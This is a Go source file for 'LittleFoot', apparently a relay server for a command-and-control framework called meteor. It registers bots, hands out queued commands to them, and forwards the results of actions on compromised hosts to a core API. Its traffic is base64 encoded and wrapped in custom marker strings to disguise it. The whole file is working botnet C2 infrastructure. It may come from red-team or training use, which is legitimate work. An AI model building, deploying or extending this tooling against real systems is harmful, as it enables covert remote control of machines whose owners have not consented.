// Shoutout to for a helpful blogpost/example @donutdan4114
package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

// CORE is the address/port of the meteor core API
var CORE = "http://172.69.1.1:9999"

// PORT : port to listen on
var PORT = "8080"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

// MAGICBYTE is the single byte (rather than a byte array)
var MAGICBYTE = MAGIC[0]

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = "XXXXX" //string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = "YYYYY" //string(MAGICTERM)

//take the MAD payload and do stuff with it
func connHandle(rw http.ResponseWriter, req *http.Request) {
	bytmessage, err := ioutil.ReadAll(req.Body)
	message := string(bytmessage)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	decMsg := decodePayload(message)
	result := handlePayload(decMsg)
	encRes := encodePayload(result)
	bytEncRes := []byte(encRes)
	rw.Write(bytEncRes)
}

//take buffer from conn handler, turn it into a string
func decodePayload(payload string) string {
	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
	encodedPayload = strings.Replace(encodedPayload, "{\"comms\":\"", "", 1)
	encodedPayload = strings.Replace(encodedPayload, "\"}", "", 1)
	fmt.Println("enc: " + encodedPayload)
	data, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		fmt.Println("error:", err)
		return ""
	}
	return string(data)
}

//turn the normal string into a MAD payload
func encodePayload(data string) string {
	encStr := base64.StdEncoding.EncodeToString([]byte(data))
	fin := MAGICSTR + encStr + MAGICTERMSTR
	return fin
}

// take string of payload, depending on mode/arguments: pass to handler functions
func handlePayload(payload string) string {
	splitPayload := strings.SplitN(payload, "||", 3)
	mode := splitPayload[0]
	aid := splitPayload[1]
	data := splitPayload[2]
	retval := ""
	switch mode {
	case "C":
		retval = registerBot(data)
	case "D":
		retval = getCommands(data)
	case "E":
		retval = addResult(data, aid)
	default:
		return ""
	}
	return retval
}

// take params from bot and register it in the DB
func registerBot(payload string) string {
	url := CORE + "/register/bot"
	splitPayload := strings.Split(payload, "||")
	uid := splitPayload[0]
	intrv := splitPayload[1]
	dlt := splitPayload[2]
	hn := splitPayload[3]

	cli := http.Client{}
	prejson := `{"uuid":"` + uid + `", "interval":"` + intrv + `", "delta": "` + dlt + `", "hostname": "` + hn + `"}`
	jsonStr := []byte(prejson)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	resp, err := cli.Do(req)
	if err != nil {
		return "Error: Unable to reach server"
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body)
}

//split commands into a format the bot can easily read
func parseCommands(cstr string) string {
	retStr := ""
	carr := strings.Split(cstr, "}, {")
	for _, comStr := range carr {
		comStr = strings.Replace(comStr, "[{", "", 1)
		comStr = strings.Replace(comStr, "}]", "", 1)
		comStr = strings.Replace(comStr, "'id': ", "", 1)
		comStr = strings.Replace(comStr, ", 'mode': '", ":", 1)
		comStr = strings.Replace(comStr, "', 'arguments': '", ":", 1)
		comStr = strings.Replace(comStr, "', 'options': ''", "", 1)
		retStr = retStr + comStr + "<||>"
	}
	retStr = strings.TrimSuffix(retStr, "<||>")
	return retStr
}

// pull all commands from DB associated with hostname
func getCommands(payload string) string {
	url := CORE + "/get/command"
	uid := payload
	cli := http.Client{}
	prejson := `{"uuid":"` + uid + `"}`
	jsonStr := []byte(prejson)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	resp, err := cli.Do(req)
	if err != nil {
		return "Error: Unable to reach server"
	}
	body, _ := ioutil.ReadAll(resp.Body)
	if string(body) == "[]" {
		return "0:0:0" // return no commands
	}
	prsd := parseCommands(string(body))
	return prsd
}

// send the post request with actionID and result data
func postResult(aid string, result string) {
	url := CORE + "/add/actionresult"
	cli := http.Client{}
	prejson := `{"actionid":"` + aid + `", "data":"` + result + `"}`
	jsonStr := []byte(prejson)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	cli.Do(req)
	return
}

// send the action result back to the DB for feedback tracking
func addResult(payload string, aid string) string {
	resArray := strings.Split(payload, "<||>")
	for _, res := range resArray {
		splitRes := strings.Split(res, ":")
		aid := splitRes[0]
		result := splitRes[1]
		postResult(aid, result)
	}
	return "Done"
}

func lfStatus(rw http.ResponseWriter, req *http.Request) {
	rw.Write([]byte("LittleFoot server is running.\n"))
}

func main() {
	fmt.Println("Listening for LittleFoot connections on port: " + PORT + "...")
	http.HandleFunc("/", lfStatus)
	http.HandleFunc("/communicate", connHandle)
	portStr := ":" + PORT
	http.ListenAndServe(portStr, nil)
}
